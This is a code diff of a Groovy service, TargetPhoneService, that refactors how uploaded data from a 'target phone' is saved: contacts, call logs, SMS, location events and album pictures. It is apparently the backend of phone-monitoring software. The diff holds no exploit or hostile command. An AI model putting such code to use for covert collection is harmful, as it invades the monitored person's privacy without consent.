@@ -16,52 +16,30 @@ import com.xaviar.market.rest.item.DataHolder
 
 class TargetPhoneService {
 
-	private save(DataHolder dataHolder,String authSimSubscriberId,User authUser){
-
+	def save(DataHolder dataHolder,String authSimSubscriberId,User authUser){
+		
 		TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);
-
+		
 		//target phone parameters
 		if(dataHolder.containsKey(dataHolder.PHONE_PARAMS)){
-			addPhoneParams(dataHolder, authSimSubscriberId,authUser)
+			addPhoneParams(dataHolder, authSimSubscriberId,authUser);
 		}
-
-		//target phone contacts
-		if(dataHolder.containsKey(dataHolder.CONTACTS)){
-			addContacts(dataHolder, targetPhone)
-		}
-
-		//target phone call logs
-		if(dataHolder.containsKey(dataHolder.CALL_LOG)){
-			addCallLogs(dataHolder, targetPhone)
-		}
-
-		//target phone call log events
-		if(dataHolder.containsKey(dataHolder.PHONE_EVENT)){
-			addCallLogEvents(dataHolder, targetPhone)
-		}
-
-		//target phone location events
-		if(dataHolder.containsKey(dataHolder.LOCATION_EVENT)){
-			addLocationEvents(dataHolder, targetPhone)
-		}
-
-		//target phone smses
-		if(dataHolder.containsKey(dataHolder.SMS)){
-			addSmses(dataHolder, targetPhone)
-		}
-
-		//target phone sms events
-		if(dataHolder.containsKey(dataHolder.SMS_EVENT)){
-			addSmsEvents(dataHolder, targetPhone)
-		}
-
-		//target phone album pictures
-		if(dataHolder.containsKey(dataHolder.BIN_ZIP_PICTURES)){
-			addPictures(dataHolder, targetPhone)
+		
+		for ( String key : dataHolder.getMap().keySet() ) {			
+			switch(key){				
+				case dataHolder.PHONE_PARAMS : break;
+				case dataHolder.CONTACTS : addContacts(dataHolder, targetPhone); break;
+				case dataHolder.CALL_LOG : addCallLogs(dataHolder, targetPhone); break;
+				case dataHolder.PHONE_EVENT : addCallLogEvents(dataHolder, targetPhone); break;
+				case dataHolder.LOCATION_EVENT : addLocationEvents(dataHolder, targetPhone); break;
+				case dataHolder.SMS : addSmses(dataHolder, targetPhone); break;
+				case dataHolder.SMS_EVENT : addSmsEvents(dataHolder, targetPhone); break;
+				case dataHolder.BIN_ZIP_PICTURES : addPictures(dataHolder, targetPhone); break;				
+			}			
 		}
 	}
 
-	private addPictures(DataHolder dataHolder, TargetPhone targetPhone) {
+	def addPictures(DataHolder dataHolder, TargetPhone targetPhone) {
 		String clientPics = dataHolder.get(DataHolder.BIN_ZIP_PICTURES);
 		if (clientPics != null) {
 			ObjectMapper mapper = new ObjectMapper();
@@ -74,7 +52,7 @@ class TargetPhoneService {
 		}
 	}
 
-	private addSmsEvents(DataHolder dataHolder, TargetPhone targetPhone) {
+	def addSmsEvents(DataHolder dataHolder, TargetPhone targetPhone) {
 		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
 		if (clientSmsEvent != null) {
 			ObjectMapper mapper = new ObjectMapper();
@@ -91,7 +69,7 @@ class TargetPhoneService {
 		}
 	}
 
-	private addSmses(DataHolder dataHolder, TargetPhone targetPhone) {
+	def addSmses(DataHolder dataHolder, TargetPhone targetPhone) {
 		String clientSms = dataHolder.get(DataHolder.SMS);
 		if (clientSms != null) {
 			ObjectMapper mapper = new ObjectMapper();
@@ -109,7 +87,7 @@ class TargetPhoneService {
 		}
 	}
 
-	private addLocationEvents(DataHolder dataHolder, TargetPhone targetPhone) {
+	def addLocationEvents(DataHolder dataHolder, TargetPhone targetPhone) {
 		String clientLocation = dataHolder.get(DataHolder.LOCATION_EVENT);
 		if (clientLocation != null) {
 			ObjectMapper mapper = new ObjectMapper();
@@ -135,7 +113,7 @@ class TargetPhoneService {
 		}
 	}
 
-	private addCallLogEvents(DataHolder dataHolder, TargetPhone targetPhone) {
+	def addCallLogEvents(DataHolder dataHolder, TargetPhone targetPhone) {
 		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
 		if (clientPhoneEvent != null) {
 			ObjectMapper mapper = new ObjectMapper();
@@ -152,7 +130,7 @@ class TargetPhoneService {
 		}
 	}
 
-	private addCallLogs(DataHolder dataHolder, TargetPhone targetPhone) {
+	def addCallLogs(DataHolder dataHolder, TargetPhone targetPhone) {
 		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
 		if (clientCallLog != null) {
 			ObjectMapper mapper = new ObjectMapper();
